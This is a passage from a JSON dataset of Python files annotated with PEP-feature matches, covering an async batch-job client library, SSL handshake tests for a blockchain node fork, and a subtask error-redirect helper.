self._job_id)\n    def __init__(self, batch_builder, job_id):\n        self._batch_builder = batch_builder\n        self._job_id = job_id\n    @property\n    def batch_id(self):\n        raise ValueError(\"cannot get the batch_id of an unsubmitted job\")\n    @property\n    def job_id(self):\n        raise ValueError(\"cannot get the job_id of an unsubmitted job\")\n    @property\n    def id(self):\n        raise ValueError(\"cannot get the id of an unsubmitted job\")\n    async def attributes(self):\n        raise ValueError(\"cannot get the attributes of an unsubmitted job\")\n    async def is_complete(self):\n        raise ValueError(\"cannot determine if an unsubmitted job is complete\")\n    async def status(self):\n        raise ValueError(\"cannot get the status of an unsubmitted job\")\n    @property\n    def _status(self):\n        raise ValueError(\"cannot get the _status of an unsubmitted job\")\n    async def wait(self):\n        raise ValueError(\"cannot wait on an unsubmitted job\")\n    async def log(self):\n        raise ValueError(\"cannot get the log of an unsubmitted job\")\n    async def attempts(self):\n        raise ValueError(\"cannot get the attempts of an unsubmitted job\")\nclass SubmittedJob:\n    def __init__(self, batch, job_id, _status=None):\n        self._batch = batch\n        self.batch_id = batch.id\n        self.job_id = job_id\n        self.id = (self.batch_id, self.job_id)\n        self._status = _status\n    async def attributes(self):\n        if not self._status:\n            await self.status()\n        return self._status['attributes']\n    async def is_complete(self):\n        if self._status:\n            state = self._status['state']\n            if state in complete_states:\n                return True\n        await self.status()\n        state = self._status['state']\n        return state in complete_states\n    async def status(self):\n        resp = await self._batch._client._get(f'/api/v1alpha/batches/{self.batch_id}/jobs/{self.job_id}')\n        self._status = await resp.json()\n        return self._status\n    async def wait(self):\n        i = 0\n        while True:\n            if await self.is_complete():\n                return self._status\n            j = random.randrange(math.floor(1.1 ** i))\n            await asyncio.sleep(0.100 * j)\n            if i < 64:\n                i = i + 1\n    async def log(self):\n        resp = await self._batch._client._get(f'/api/v1alpha/batches/{self.batch_id}/jobs/{self.job_id}/log')\n        return await resp.json()\n    async def attempts(self):\n        resp = await self._batch._client._get(f'/api/v1alpha/batches/{self.batch_id}/jobs/{self.job_id}/attempts')\n        return await resp.json()\nclass Batch:\n    def __init__(self, client, id, attributes, n_jobs, token, last_known_status=None):\n        self._client = client\n        self.id = id\n        self.attributes = attributes\n        self.n_jobs = n_jobs\n        self.token = token\n        self._last_known_status = last_known_status\n    async def cancel(self):\n        await self._client._patch(f'/api/v1alpha/batches/{self.id}/cancel')\n    async def jobs(self, q=None):\n        last_job_id = None\n        while True:\n            params = {}\n            if q is not None:\n                params['q'] = q\n            if last_job_id is not None:\n                params['last_job_id'] = last_job_id\n            resp = await self._client._get(f'/api/v1alpha/batches/{self.id}/jobs', params=params)\n            body = await resp.json()\n            for job in body['jobs']:\n                yield job\n            last_job_id = body.get('last_job_id')\n            if last_job_id is None:\n                break\n    async def get_job(self, job_id: int) -> Job:\n        return await self._client.get_job(self.id, job_id)\n    async def get_job_log(self, job_id: int) -> Optional[Dict[str, Any]]:\n        return await self._client.get_job_log(self.id, job_id)\n    async def status(self):\n        resp = await self._client._get(f'/api/v1alpha/batches/{self.id}')\n        self._last_known_status = await resp.json()\n        return self._last_known_status\n    async def last_known_status(self):\n        if self._last_known_status is None:\n            return await self.status()  \n        return self._last_known_status\n    async def wait(self, *, disable_progress_bar=TQDM_DEFAULT_DISABLE):\n        i = 0\n        with tqdm(total=self.n_jobs,\n                  disable=disable_progress_bar,\n                  desc='completed jobs') as pbar:\n            while True:\n                status = await self.status()\n                pbar.update(status['n_completed'] - pbar.n)\n                if status['complete']:\n                    return status\n                j = random.randrange(math.floor(1.1 ** i))\n                await asyncio.sleep(0.100 * j)\n                if i < 64:\n                    i = i + 1\n    async def delete(self):\n        await self._client._delete(f'/api/v1alpha/batches/{self.id}')\nclass BatchBuilder:\n    def __init__(self, client, attributes, callback, token=None, cancel_after_n_failures=None):\n        self._client = client\n        self._job_idx = 0\n        self._job_specs = []\n        self._jobs = []\n        self._submitted = False\n        self.attributes = attributes\n        self.callback = callback\n        if token is None:\n            token = secrets.token_urlsafe(32)\n        self.token = token\n        self._cancel_after_n_failures = cancel_after_n_failures\n    def create_job(self, image, command, env=None, mount_docker_socket=False,\n                   port=None, resources=None, secrets=None,\n                   service_account=None, attributes=None, parents=None,\n                   input_files=None, output_files=None, always_run=False,\n                   timeout=None, gcsfuse=None, requester_pays_project=None,\n                   mount_tokens=False, network: Optional[str] = None):\n        if self._submitted:\n            raise ValueError(\"cannot create a job in an already submitted batch\")\n        self._job_idx += 1\n        if parents is None:\n            parents = []\n        parent_ids = []\n        foreign_batches = []\n        invalid_job_ids = []\n        for parent in parents:\n            job = parent._job\n            if isinstance(job, UnsubmittedJob):\n                if job._batch_builder != self:\n                    foreign_batches.append(job)\n                elif not 0 < job._job_id < self._job_idx:\n                    invalid_job_ids.append(job)\n                else:\n                    parent_ids.append(job._job_id)\n            else:\n                foreign_batches.append(job)\n        error_msg = []\n        if len(foreign_batches) != 0:\n            error_msg.append('Found {} parents from another batch:\\n{}'.format(str(len(foreign_batches)),\n                                                                               \"\\n\".join([str(j) for j in foreign_batches])))\n        if len(invalid_job_ids) != 0:\n            error_msg.append('Found {} parents with invalid job ids:\\n{}'.format(str(len(invalid_job_ids)),\n                                                                                 \"\\n\".join([str(j) for j in invalid_job_ids])))\n        if error_msg:\n            raise ValueError(\"\\n\".join(error_msg))\n        job_spec = {\n            'always_run': always_run,\n            'job_id': self._job_idx,\n            'parent_ids': parent_ids,\n            'process': {\n                'command': command,\n                'image': image,\n                'mount_docker_socket': mount_docker_socket,\n                'type': 'docker'\n            }\n        }\n        if env:\n            job_spec['env'] = [{'name': k, 'value': v} for (k, v) in env.items()]\n        if port is not None:\n            job_spec['port'] = port\n        if resources:\n            job_spec['resources'] = resources\n        if secrets:\n            job_spec['secrets'] = secrets\n        if service_account:\n            job_spec['service_account'] = service_account\n        if timeout:\n            job_spec['timeout'] = timeout\n        if attributes:\n            job_spec['attributes'] = attributes\n        if input_files:\n            job_spec['input_files'] = [{\"from\": src, \"to\": dst} for (src, dst) in input_files]\n        if output_files:\n            job_spec['output_files'] = [{\"from\": src, \"to\": dst} for (src, dst) in output_files]\n        if gcsfuse:\n            job_spec['gcsfuse'] = [{\"bucket\": bucket, \"mount_path\": mount_path, \"read_only\": read_only}\n                                   for (bucket, mount_path, read_only) in gcsfuse]\n        if requester_pays_project:\n            job_spec['requester_pays_project'] = requester_pays_project\n        if mount_tokens:\n            job_spec['mount_tokens'] = mount_tokens\n        if network:\n            job_spec['network'] = network\n        self._job_specs.append(job_spec)\n        j = Job.unsubmitted_job(self, self._job_idx)\n        self._jobs.append(j)\n        return j\n    async def _submit_jobs(self, batch_id, byte_job_specs, n_jobs, pbar):\n        assert len(byte_job_specs) > 0, byte_job_specs\n        b = bytearray()\n        b.append(ord('['))\n        i = 0\n        while i < len(byte_job_specs):\n            spec = byte_job_specs[i]\n            if i > 0:\n                b.append(ord(','))\n            b.extend(spec)\n            i += 1\n        b.append(ord(']'))\n        await self._client._post(\n            f'/api/v1alpha/batches/{batch_id}/jobs/create',\n            data=aiohttp.BytesPayload(\n                b, content_type='application/json', encoding='utf-8'))\n        pbar.update(n_jobs)\n    async def _create(self):\n        n_jobs = len(self._job_specs)\n        batch_spec = {'billing_project': self._client.billing_project,\n                      'n_jobs': n_jobs,\n                      'token': self.token}\n        if self.attributes:\n            batch_spec['attributes'] = self.attributes\n        if self.callback:\n            batch_spec['callback'] = self.callback\n        if self._cancel_after_n_failures is not None:\n            batch_spec['cancel_after_n_failures'] = self._cancel_after_n_failures\n        batch_json = await (await self._client._post('/api/v1alpha/batches/create',\n                                                     json=batch_spec)).json()\n        return Batch(self._client, batch_json['id'], self.attributes, n_jobs, self.token)\n    MAX_BUNCH_BYTESIZE = 1024 * 1024\n    MAX_BUNCH_SIZE = 1024\n    async def submit(self,\n                     max_bunch_bytesize=MAX_BUNCH_BYTESIZE,\n                     max_bunch_size=MAX_BUNCH_SIZE,\n                     disable_progress_bar=TQDM_DEFAULT_DISABLE):\n        assert max_bunch_bytesize > 0\n        assert max_bunch_size > 0\n        if self._submitted:\n            raise ValueError(\"cannot submit an already submitted batch\")\n        batch = await self._create()\n        id = batch.id\n        log.info(f'created batch {id}')\n        byte_job_specs = [json.dumps(job_spec).encode('utf-8')\n                          for job_spec in self._job_specs]\n        byte_job_specs_bunches = []\n        bunch_sizes = []\n        bunch = []\n        bunch_n_bytes = 0\n        bunch_n_jobs = 0\n        for spec in byte_job_specs:\n            n_bytes = len(spec)\n            assert n_bytes < max_bunch_bytesize, (\n                f'every job spec must be less than max_bunch_bytesize,'\n                f' { max_bunch_bytesize }B, but {spec} is larger')\n            if bunch_n_bytes + n_bytes < max_bunch_bytesize and len(bunch) < max_bunch_size:\n                bunch.append(spec)\n                bunch_n_bytes += n_bytes\n                bunch_n_jobs += 1\n            else:\n                byte_job_specs_bunches.append(bunch)\n                bunch_sizes.append(bunch_n_jobs)\n                bunch = [spec]\n                bunch_n_bytes = n_bytes\n                bunch_n_jobs = 1\n        if bunch:\n            byte_job_specs_bunches.append(bunch)\n            bunch_sizes.append(bunch_n_jobs)\n        with tqdm(total=len(self._job_specs),\n                  disable=disable_progress_bar,\n                  desc='jobs submitted to queue') as pbar:\n            await bounded_gather(\n                *[functools.partial(self._submit_jobs, id, bunch, size, pbar)\n                  for bunch, size in zip(byte_job_specs_bunches, bunch_sizes)],\n                parallelism=6)\n        await self._client._patch(f'/api/v1alpha/batches/{id}/close')\n        log.info(f'closed batch {id}')\n        for j in self._jobs:\n            j._job = j._job._submit(batch)\n        self._job_specs = []\n        self._jobs = []\n        self._job_idx = 0\n        self._submitted = True\n        return batch\nclass BatchClient:\n    def __init__(self,\n                 billing_project: str,\n                 deploy_config: Optional[DeployConfig] = None,\n                 session: Optional[aiohttp.ClientSession] = None,\n                 headers: Optional[Dict[str, str]] = None,\n                 _token: Optional[str] = None,\n                 token_file: Optional[str] = None):\n        self.billing_project = billing_project\n        if not deploy_config:\n            deploy_config = get_deploy_config()\n        self.url = deploy_config.base_url('batch')\n        if session is None:\n            session = client_session()\n        self._session = session\n        h: Dict[str, str] = {}\n        if headers:\n            h.update(headers)\n        if _token:\n            h['Authorization'] = f'Bearer {_token}'\n        else:\n            h.update(service_auth_headers(deploy_config, 'batch', token_file=token_file))\n        self._headers = h\n    async def _get(self, path, params=None):\n        return await request_retry_transient_errors(\n            self._session, 'GET',\n            self.url + path, params=params, headers=self._headers)\n    async def _post(self, path, data=None, json=None):\n        return await request_retry_transient_errors(\n            self._session, 'POST',\n            self.url + path, data=data, json=json, headers=self._headers)\n    async def _patch(self, path):\n        return await request_retry_transient_errors(\n            self._session, 'PATCH',\n            self.url + path, headers=self._headers)\n    async def _delete(self, path):\n        return await request_retry_transient_errors(\n            self._session, 'DELETE',\n            self.url + path, headers=self._headers)\n    async def list_batches(self, q=None, last_batch_id=None, limit=2**64):\n        n = 0\n        while True:\n            params = {}\n            if q is not None:\n                params['q'] = q\n            if last_batch_id is not None:\n                params['last_batch_id'] = last_batch_id\n            resp = await self._get('/api/v1alpha/batches', params=params)\n            body = await resp.json()\n            for batch in body['batches']:\n                if n >= limit:\n                    return\n                n += 1\n                yield Batch(self, batch['id'], attributes=batch.get('attributes'),\n                            n_jobs=int(batch['n_jobs']), token=batch['token'], last_known_status=batch)\n            last_batch_id = body.get('last_batch_id')\n            if last_batch_id is None:\n                break\n    async def get_job(self, batch_id, job_id):\n        b = await self.get_batch(batch_id)\n        j_resp = await self._get(f'/api/v1alpha/batches/{batch_id}/jobs/{job_id}')\n        j = await j_resp.json()\n        return Job.submitted_job(\n            b,\n            j['job_id'],\n            _status=j)\n    async def get_job_log(self, batch_id, job_id) -> Optional[Dict[str, Any]]:\n        resp = await self._get(\n            f'/api/v1alpha/batches/{batch_id}/jobs/{job_id}/log')\n        return await resp.json()\n    async def get_job_attempts(self, batch_id, job_id):\n        resp = await self._get(\n            f'/api/v1alpha/batches/{batch_id}/jobs/{job_id}/attempts')\n        return await resp.json()\n    async def get_batch(self, id):\n        b_resp = await self._get(f'/api/v1alpha/batches/{id}')\n        b = await b_resp.json()\n        return Batch(self,\n                     b['id'],\n                     attributes=b.get('attributes'),\n                     n_jobs=int(b['n_jobs']),\n                     token=b['token'],\n                     last_known_status=b)\n    def create_batch(self, attributes=None, callback=None, token=None, cancel_after_n_failures=None):\n        return BatchBuilder(self, attributes, callback, token, cancel_after_n_failures)\n    async def get_billing_project(self, billing_project):\n        bp_resp = await self._get(f'/api/v1alpha/billing_projects/{billing_project}')\n        return await bp_resp.json()\n    async def list_billing_projects(self):\n        bp_resp = await self._get('/api/v1alpha/billing_projects')\n        return await bp_resp.json()\n    async def create_billing_project(self, project):\n        bp_resp = await self._post(f'/api/v1alpha/billing_projects/{project}/create')\n        return await bp_resp.json()\n    async def add_user(self, user, project):\n        resp = await self._post(f'/api/v1alpha/billing_projects/{project}/users/{user}/add')\n        return await resp.json()\n    async def remove_user(self, user, project):\n        resp = await self._post(f'/api/v1alpha/billing_projects/{project}/users/{user}/remove')\n        return await resp.json()\n    async def close_billing_project(self, project):\n        bp_resp = await self._post(f'/api/v1alpha/billing_projects/{project}/close')\n        return await bp_resp.json()\n    async def reopen_billing_project(self, project):\n        bp_resp = await self._post(f'/api/v1alpha/billing_projects/{project}/reopen')\n        return await bp_resp.json()\n    async def delete_billing_project(self, project):\n        bp_resp = await self._post(f'/api/v1alpha/billing_projects/{project}/delete')\n        return await bp_resp.json()\n    async def edit_billing_limit(self, project, limit):\n        bp_resp = await self._post(f'/api/v1alpha/billing_limits/{project}/edit',\n                                   json={'limit': limit})\n        return await bp_resp.json()\n    async def close(self):\n        await self._session.close()\n        self._session = None\n    async def __aenter__(self):\n        return self\n    async def __aexit__(self, exc_type, exc_val, exc_tb):\n        await self.close()",
            "patterns": {
                "pep_526": [
                    [
                        476,
                        "h: Dict[str, str] = {}"
                    ]
                ],
                "pep_567": [
                    [
                        7,
                        7,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        1,
                        "from typing import Optional, Dict, Any",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        476,
                        "        h: Dict[str, str] = {}",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        244,
                        258,
                        "async generator",
                        "async def jobs(self, q=None):\n        last_job_id = None\n        while True:\n            params = {}\n            if q is not None:\n                params['q'] = q\n            if last_job_id is not None:\n                params['last_job_id'] = last_job_id\n            resp = await self._client._get(f'/api/v1alpha/batches/{self.id}/jobs', params=params)\n            body = await resp.json()\n            for job in body['jobs']:\n                yield job\n            last_job_id = body.get('last_job_id')\n            if last_job_id is None:\n                break"
                    ],
                    [
                        500,
                        518,
                        "async generator",
                        "async def list_batches(self, q=None, last_batch_id=None, limit=2**64):\n        n = 0\n        while True:\n            params = {}\n            if q is not None:\n                params['q'] = q\n            if last_batch_id is not None:\n                params['last_batch_id'] = last_batch_id\n            resp = await self._get('/api/v1alpha/batches', params=params)\n            body = await resp.json()\n            for batch in body['batches']:\n                if n >= limit:\n                    return\n                n += 1\n                yield Batch(self, batch['id'], attributes=batch.get('attributes'),\n                            n_jobs=int(batch['n_jobs']), token=batch['token'], last_known_status=batch)\n            last_batch_id = body.get('last_batch_id')\n            if last_batch_id is None:\n                break"
                    ]
                ],
                "pep_498v": [
                    [
                        327,
                        328,
                        ".format()"
                    ],
                    [
                        330,
                        331,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        419,
                        "        log.info(f'created batch {id}')"
                    ],
                    [
                        430,
                        "                f'every job spec must be less than max_bunch_bytesize,'"
                    ],
                    [
                        453,
                        "        log.info(f'closed batch {id}')"
                    ],
                    [
                        480,
                        "            h['Authorization'] = f'Bearer {_token}'"
                    ],
                    [
                        216,
                        "        resp = await self._batch._client._get(f'/api/v1alpha/batches/{self.batch_id}/jobs/{self.job_id}')"
                    ],
                    [
                        229,
                        "        resp = await self._batch._client._get(f'/api/v1alpha/batches/{self.batch_id}/jobs/{self.job_id}/log')"
                    ],
                    [
                        232,
                        "        resp = await self._batch._client._get(f'/api/v1alpha/batches/{self.batch_id}/jobs/{self.job_id}/attempts')"
                    ],
                    [
                        243,
                        "        await self._client._patch(f'/api/v1alpha/batches/{self.id}/cancel')"
                    ],
                    [
                        264,
                        "        resp = await self._client._get(f'/api/v1alpha/batches/{self.id}')"
                    ],
                    [
                        286,
                        "        await self._client._delete(f'/api/v1alpha/batches/{self.id}')"
                    ],
                    [
                        389,
                        "            f'/api/v1alpha/batches/{batch_id}/jobs/create',"
                    ],
                    [
                        452,
                        "        await self._client._patch(f'/api/v1alpha/batches/{id}/close')"
                    ],
                    [
                        521,
                        "        j_resp = await self._get(f'/api/v1alpha/batches/{batch_id}/jobs/{job_id}')"
                    ],
                    [
                        529,
                        "            f'/api/v1alpha/batches/{batch_id}/jobs/{job_id}/log')"
                    ],
                    [
                        533,
                        "            f'/api/v1alpha/batches/{batch_id}/jobs/{job_id}/attempts')"
                    ],
                    [
                        536,
                        "        b_resp = await self._get(f'/api/v1alpha/batches/{id}')"
                    ],
                    [
                        547,
                        "        bp_resp = await self._get(f'/api/v1alpha/billing_projects/{billing_project}')"
                    ],
                    [
                        553,
                        "        bp_resp = await self._post(f'/api/v1alpha/billing_projects/{project}/create')"
                    ],
                    [
                        556,
                        "        resp = await self._post(f'/api/v1alpha/billing_projects/{project}/users/{user}/add')"
                    ],
                    [
                        559,
                        "        resp = await self._post(f'/api/v1alpha/billing_projects/{project}/users/{user}/remove')"
                    ],
                    [
                        562,
                        "        bp_resp = await self._post(f'/api/v1alpha/billing_projects/{project}/close')"
                    ],
                    [
                        565,
                        "        bp_resp = await self._post(f'/api/v1alpha/billing_projects/{project}/reopen')"
                    ],
                    [
                        568,
                        "        bp_resp = await self._post(f'/api/v1alpha/billing_projects/{project}/delete')"
                    ],
                    [
                        571,
                        "        bp_resp = await self._post(f'/api/v1alpha/billing_limits/{project}/edit',"
                    ],
                    [
                        252,
                        "            resp = await self._client._get(f'/api/v1alpha/batches/{self.id}/jobs', params=params)"
                    ]
                ]
            }
        },
        "60": {
            "file": "import asyncio\nimport aiohttp\nimport pytest\nfrom fork.protocols.shared_protocol import protocol_version\nfrom fork.server.outbound_message import NodeType\nfrom fork.server.server import ForkServer, ssl_context_for_client\nfrom fork.server.ws_connection import WSForkConnection\nfrom fork.ssl.create_ssl import generate_ca_signed_cert\nfrom fork.types.peer_info import PeerInfo\nfrom tests.block_tools import test_constants\nfrom fork.util.ints import uint16\nfrom tests.setup_nodes import (\n    bt,\n    self_hostname,\n    setup_farmer_harvester,\n    setup_introducer,\n    setup_simulators_and_wallets,\n    setup_timelord,\n)\nasync def establish_connection(server: ForkServer, dummy_port: int, ssl_context) -> bool:\n    timeout = aiohttp.ClientTimeout(total=10)\n    session = aiohttp.ClientSession(timeout=timeout)\n    try:\n        incoming_queue: asyncio.Queue = asyncio.Queue()\n        url = f\"wss://{self_hostname}:{server._port}/ws\"\n        ws = await session.ws_connect(url, autoclose=False, autoping=True, ssl=ssl_context)\n        wsc = WSForkConnection(\n            NodeType.FULL_NODE,\n            ws,\n            server._port,\n            server.log,\n            True,\n            False,\n            self_hostname,\n            incoming_queue,\n            lambda x, y: x,\n            None,\n            100,\n            30,\n        )\n        handshake = await wsc.perform_handshake(server._network_id, protocol_version, dummy_port, NodeType.FULL_NODE)\n        await session.close()\n        return handshake\n    except Exception:\n        await session.close()\n        return False\nclass TestSSL:\n    @pytest.fixture(scope=\"function\")\n    async def harvester_farmer(self):\n        async for _ in setup_farmer_harvester(test_constants):\n            yield _\n    @pytest.fixture(scope=\"function\")\n    async def wallet_node(self):\n        async for _ in setup_simulators_and_wallets(1, 1, {}):\n            yield _\n    @pytest.fixture(scope=\"function\")\n    async def introducer(self):\n        async for _ in setup_introducer(21233):\n            yield _\n    @pytest.fixture(scope=\"function\")\n    async def timelord(self):\n        async for _ in setup_timelord(21236, 21237, False, test_constants, bt):\n            yield _\n    @pytest.mark.asyncio\n    async def test_public_connections(self, wallet_node):\n        full_nodes, wallets = wallet_node\n        full_node_api = full_nodes[0]\n        server_1: ForkServer = full_node_api.full_node.server\n        wallet_node, server_2 = wallets[0]\n        success = await server_2.start_client(PeerInfo(self_hostname, uint16(server_1._port)), None)\n        assert success is True\n    @pytest.mark.asyncio\n    async def test_farmer(self, harvester_farmer):\n        harvester_api, farmer_api = harvester_farmer\n        farmer_server = farmer_api.farmer.server\n        priv_crt = farmer_server._private_key_path.parent / \"valid.crt\"\n        priv_key = farmer_server._private_key_path.parent / \"valid.key\"\n        generate_ca_signed_cert(\n            farmer_server.ca_private_crt_path.read_bytes(),\n            farmer_server.ca_private_key_path.read_bytes(),\n            priv_crt,\n            priv_key,\n        )\n        ssl_context = ssl_context_for_client(\n            farmer_server.ca_private_crt_path, farmer_server.ca_private_crt_path, priv_crt, priv_key\n        )\n        connected = await establish_connection(farmer_server, 12312, ssl_context)\n        assert connected is True\n        pub_crt = farmer_server._private_key_path.parent / \"non_valid.crt\"\n        pub_key = farmer_server._private_key_path.parent / \"non_valid.key\"\n        generate_ca_signed_cert(\n            farmer_server.fork_ca_crt_path.read_bytes(), farmer_server.fork_ca_key_path.read_bytes(), pub_crt, pub_key\n        )\n        ssl_context = ssl_context_for_client(\n            farmer_server.fork_ca_crt_path, farmer_server.fork_ca_crt_path, pub_crt, pub_key\n        )\n        connected = await establish_connection(farmer_server, 12312, ssl_context)\n        assert connected is False\n        ssl_context = ssl_context_for_client(\n            farmer_server.ca_private_crt_path, farmer_server.ca_private_crt_path, pub_crt, pub_key\n        )\n        connected = await establish_connection(farmer_server, 12312, ssl_context)\n        assert connected is False\n    @pytest.mark.asyncio\n    async def test_full_node(self, wallet_node):\n        full_nodes, wallets = wallet_node\n        full_node_api = full_nodes[0]\n        full_node_server = full_node_api.full_node.server\n        pub_crt = full_node_server._private_key_path.parent / \"p2p.crt\"\n        pub_key = full_node_server._private_key_path.parent / \"p2p.key\"\n        generate_ca_signed_cert(\n            full_node_server.fork_ca_crt_path.read_bytes(),\n            full_node_server.fork_ca_key_path.read_bytes(),\n            pub_crt,\n            pub_key,\n        )\n        ssl_context = ssl_context_for_client(\n            full_node_server.fork_ca_crt_path, full_node_server.fork_ca_crt_path, pub_crt, pub_key\n        )\n        connected = await establish_connection(full_node_server, 12312, ssl_context)\n        assert connected is True\n    @pytest.mark.asyncio\n    async def test_wallet(self, wallet_node):\n        full_nodes, wallets = wallet_node\n        wallet_node, wallet_server = wallets[0]\n        pub_crt = wallet_server._private_key_path.parent / \"p2p.crt\"\n        pub_key = wallet_server._private_key_path.parent / \"p2p.key\"\n        generate_ca_signed_cert(\n            wallet_server.fork_ca_crt_path.read_bytes(), wallet_server.fork_ca_key_path.read_bytes(), pub_crt, pub_key\n        )\n        ssl_context = ssl_context_for_client(\n            wallet_server.fork_ca_crt_path, wallet_server.fork_ca_crt_path, pub_crt, pub_key\n        )\n        connected = await establish_connection(wallet_server, 12312, ssl_context)\n        assert connected is False\n        priv_crt = wallet_server._private_key_path.parent / \"valid.crt\"\n        priv_key = wallet_server._private_key_path.parent / \"valid.key\"\n        generate_ca_signed_cert(\n            wallet_server.ca_private_crt_path.read_bytes(),\n            wallet_server.ca_private_key_path.read_bytes(),\n            priv_crt,\n            priv_key,\n        )\n        ssl_context = ssl_context_for_client(\n            wallet_server.ca_private_crt_path, wallet_server.ca_private_crt_path, priv_crt, priv_key\n        )\n        connected = await establish_connection(wallet_server, 12312, ssl_context)\n        assert connected is False\n    @pytest.mark.asyncio\n    async def test_harvester(self, harvester_farmer):\n        harvester, farmer_api = harvester_farmer\n        harvester_server = harvester.server\n        pub_crt = harvester_server._private_key_path.parent / \"p2p.crt\"\n        pub_key = harvester_server._private_key_path.parent / \"p2p.key\"\n        generate_ca_signed_cert(\n            harvester_server.fork_ca_crt_path.read_bytes(),\n            harvester_server.fork_ca_key_path.read_bytes(),\n            pub_crt,\n            pub_key,\n        )\n        ssl_context = ssl_context_for_client(\n            harvester_server.fork_ca_crt_path, harvester_server.fork_ca_crt_path, pub_crt, pub_key\n        )\n        connected = await establish_connection(harvester_server, 12312, ssl_context)\n        assert connected is False\n        priv_crt = harvester_server._private_key_path.parent / \"valid.crt\"\n        priv_key = harvester_server._private_key_path.parent / \"valid.key\"\n        generate_ca_signed_cert(\n            harvester_server.ca_private_crt_path.read_bytes(),\n            harvester_server.ca_private_key_path.read_bytes(),\n            priv_crt,\n            priv_key,\n        )\n        ssl_context = ssl_context_for_client(\n            harvester_server.ca_private_crt_path, harvester_server.ca_private_crt_path, priv_crt, priv_key\n        )\n        connected = await establish_connection(harvester_server, 12312, ssl_context)\n        assert connected is False\n    @pytest.mark.asyncio\n    async def test_introducer(self, introducer):\n        introducer_api, introducer_server = introducer\n        pub_crt = introducer_server.fork_ca_key_path.parent / \"p2p.crt\"\n        pub_key = introducer_server.fork_ca_key_path.parent / \"p2p.key\"\n        generate_ca_signed_cert(\n            introducer_server.fork_ca_crt_path.read_bytes(),\n            introducer_server.fork_ca_key_path.read_bytes(),\n            pub_crt,\n            pub_key,\n        )\n        ssl_context = ssl_context_for_client(\n            introducer_server.fork_ca_crt_path, introducer_server.fork_ca_crt_path, pub_crt, pub_key\n        )\n        connected = await establish_connection(introducer_server, 12312, ssl_context)\n        assert connected is True\n    @pytest.mark.asyncio\n    async def test_timelord(self, timelord):\n        timelord_api, timelord_server = timelord\n        pub_crt = timelord_server._private_key_path.parent / \"p2p.crt\"\n        pub_key = timelord_server._private_key_path.parent / \"p2p.key\"\n        generate_ca_signed_cert(\n            timelord_server.fork_ca_crt_path.read_bytes(),\n            timelord_server.fork_ca_key_path.read_bytes(),\n            pub_crt,\n            pub_key,\n        )\n        ssl_context = ssl_context_for_client(\n            timelord_server.fork_ca_crt_path, timelord_server.fork_ca_crt_path, pub_crt, pub_key\n        )\n        connected = await establish_connection(timelord_server, 12312, ssl_context)\n        assert connected is False\n        priv_crt = timelord_server._private_key_path.parent / \"valid.crt\"\n        priv_key = timelord_server._private_key_path.parent / \"valid.key\"\n        generate_ca_signed_cert(\n            timelord_server.ca_private_crt_path.read_bytes(),\n            timelord_server.ca_private_key_path.read_bytes(),\n            priv_crt,\n            priv_key,\n        )\n        ssl_context = ssl_context_for_client(\n            timelord_server.ca_private_crt_path, timelord_server.ca_private_crt_path, priv_crt, priv_key\n        )\n        connected = await establish_connection(timelord_server, 12312, ssl_context)\n        assert connected is False",
            "patterns": {
                "pep_526": [
                    [
                        24,
                        "incoming_queue: asyncio.Queue = asyncio.Queue()"
                    ],
                    [
                        68,
                        "server_1: ForkServer = full_node_api.full_node.server"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        49,
                        51,
                        "async generator",
                        "async def harvester_farmer(self):\n        async for _ in setup_farmer_harvester(test_constants):\n            yield _"
                    ],
                    [
                        53,
                        55,
                        "async generator",
                        "async def wallet_node(self):\n        async for _ in setup_simulators_and_wallets(1, 1, {}):\n            yield _"
                    ],
                    [
                        57,
                        59,
                        "async generator",
                        "async def introducer(self):\n        async for _ in setup_introducer(21233):\n            yield _"
                    ],
                    [
                        61,
                        63,
                        "async generator",
                        "async def timelord(self):\n        async for _ in setup_timelord(21236, 21237, False, test_constants, bt):\n            yield _"
                    ],
                    [
                        50,
                        51,
                        "async for",
                        "async for _ in setup_farmer_harvester(test_constants):\n            yield _"
                    ],
                    [
                        54,
                        55,
                        "async for",
                        "async for _ in setup_simulators_and_wallets(1, 1, {}):\n            yield _"
                    ],
                    [
                        58,
                        59,
                        "async for",
                        "async for _ in setup_introducer(21233):\n            yield _"
                    ],
                    [
                        62,
                        63,
                        "async for",
                        "async for _ in setup_timelord(21236, 21237, False, test_constants, bt):\n            yield _"
                    ]
                ],
                "pep_498": [
                    [
                        25,
                        "        url = f\"wss://{self_hostname}:{server._port}/ws\""
                    ]
                ]
            }
        },
        "61": {
            "file": "import asyncio\nimport contextlib\nimport sys\nfrom ... import oscar as mo\nfrom ...lib.aio import alru_cache\nfrom ..subtask import SubtaskResult, SubtaskStatus\nfrom ..task import TaskAPI\n@alru_cache\nasync def _get_task_api(actor: mo.Actor):\n    return await TaskAPI.create(getattr(actor, \"_session_id\"), actor.address)\n@contextlib.asynccontextmanager\nasync def redirect_subtask_errors(actor: mo.Actor, subtasks):\n    try:\n        yield\n    except:  \n        _, error, traceback = sys.exc_info()\n        status = (\n            SubtaskStatus.cancelled\n            if isinstance(error, asyncio.CancelledError)\n            else SubtaskStatus.errored\n        )\n        task_api = await _get_task_api(actor)\n        coros = []\n        for subtask in subtasks:\n            if subtask is None:  \n                continue\n            coros.append(\n                task_api.set_subtask_result(\n                    SubtaskResult(\n                        subtask_id=subtask.subtask_id,\n                        session_id=subtask.session_id,\n                        task_id=subtask.task_id,\n                        progress=1.0,\n                        status=status,\n                        error=error,\n                        traceback=traceback,\n                    )\n                )\n            )\n        await asyncio.wait(coros)\n        raise",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        12,
                        41,
                        "async generator",
